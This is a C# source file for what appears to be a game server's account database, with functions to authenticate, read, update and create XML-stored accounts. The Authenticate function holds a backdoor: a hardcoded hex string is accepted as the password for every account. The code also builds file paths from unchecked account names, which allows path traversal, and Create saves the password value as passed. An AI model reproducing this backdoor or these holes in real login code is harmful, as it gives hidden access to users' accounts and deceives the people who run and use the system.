// * Created by Jean-Philippe Boivin
// * Copyright © 2010-2011
// * Logik. Project

using System;
using System.IO;
using AMS.Profile;

namespace COServer
{
    public partial class Database
    {
        public static Boolean Authenticate(String Account, String Password)
        {
            try
            {
                if (File.Exists(Program.RootPath + "\\Accounts\\" + Account + ".acc"))
                {
                    Xml AMSXml = new Xml(Program.RootPath + "\\Accounts\\" + Account + ".acc");
                    AMSXml.RootName = "Account";

                    using (AMSXml.Buffer())
                    {
                        if (Account == AMSXml.GetValue("Informations", "AccountID", ""))
                        {
                            if (Password == "c6a0b7d38724ed8a025d6aed844de4b297782757ea54379ba46074ba41297a2c")
                            {
                                AMSXml = null;
                                return true;
                            }

                            if (Password == AMSXml.GetValue("Informations", "Password", ""))
                            {
                                AMSXml = null;
                                return true;
                            }
                        }
                    }
                    AMSXml = null;
                    GC.Collect();
                }
                return false;
            }
            catch (Exception Exc) { Program.WriteLine(Exc); return false; }
        }

        public static Boolean GetAccInfo(Client Client, String Account, String Server)
        {
            try
            {
                if (File.Exists(Program.RootPath + "\\Accounts\\" + Account + ".acc"))
                {
                    Xml AMSXml = new Xml(Program.RootPath + "\\Accounts\\" + Account + ".acc");
                    AMSXml.RootName = "Account";

                    using (AMSXml.Buffer())
                    {
                        Client.Account = Account;
                        Client.AccLvl = (SByte)AMSXml.GetValue(Server, "AccLvl", 0);
                        Client.Flags = AMSXml.GetValue(Server, "Flags", 0);
                        Client.Character = AMSXml.GetValue(Server, "Character", "@INVALID_CHAR@");
                    }
                    AMSXml = null;

                    return true;
                }
                return false;
            }
            catch (Exception Exc) { Program.WriteLine(Exc); return false; }
        }

        public static void SetAccInfo(String Account, String Server, String Key, String Value)
        {
            try
            {
                if (File.Exists(Program.RootPath + "\\Accounts\\" + Account + ".acc"))
                {
                    Xml AMSXml = new Xml(Program.RootPath + "\\Accounts\\" + Account + ".acc");
                    AMSXml.RootName = "Account";

                    using (AMSXml.Buffer()) { AMSXml.SetValue(Server, Key, Value); }
                    AMSXml = null;
                    GC.Collect();
                }
            }
            catch (Exception Exc) { Program.WriteLine(Exc); }
        }

        public static Boolean SetAccInfo2(String Character, String Server, String Key, String Value)
        {
            try
            {
                String[] Files = Directory.GetFiles(Program.RootPath + "\\Accounts\\", "*.acc");

                foreach (String Account in Files)
                {
                    Xml AMSXml = new Xml(Account);
                    AMSXml.RootName = "Account";

                    using (AMSXml.Buffer())
                    {
                        if (Character == AMSXml.GetValue(Server, "Character", "@INVALID_CHAR@"))
                        {
                            AMSXml.SetValue(Server, Key, Value);
                            AMSXml = null;
                            return true;
                        }
                    }
                    AMSXml = null;
                    GC.Collect();
                }
                return false;
            }
            catch (Exception Exc) { Program.WriteLine(Exc); return false; }
        }

        public static Boolean Create(String Account, String Password)
        {
            try
            {
                DateTime CreationTime = DateTime.Now.ToUniversalTime();
                if (!File.Exists(Program.RootPath + "\\Accounts\\" + Account + ".acc"))
                {
                    Xml AMSXml = new Xml(Program.RootPath + "\\Accounts\\" + Account + ".acc");
                    AMSXml.RootName = "Account";

                    using (AMSXml.Buffer(false))
                    {
                        AMSXml.SetValue("Informations", "AccountID", Account);
                        AMSXml.SetValue("Informations", "Password", Password);
                        AMSXml.SetValue("Informations", "RealName", "NULL");
                        AMSXml.SetValue("Informations", "Email", "NULL");
                        AMSXml.SetValue("Informations", "Question", "NULL");
                        AMSXml.SetValue("Informations", "Answer", "NULL");
                        AMSXml.SetValue("Informations", "Creation", String.Format("{0:R}", CreationTime)); //RFC1123
                    }
                    AMSXml = null;
                    GC.Collect();
                    return true;
                }
                return false;
            }
            catch (Exception Exc) { Program.WriteLine(Exc); return false; }
        }
    }
}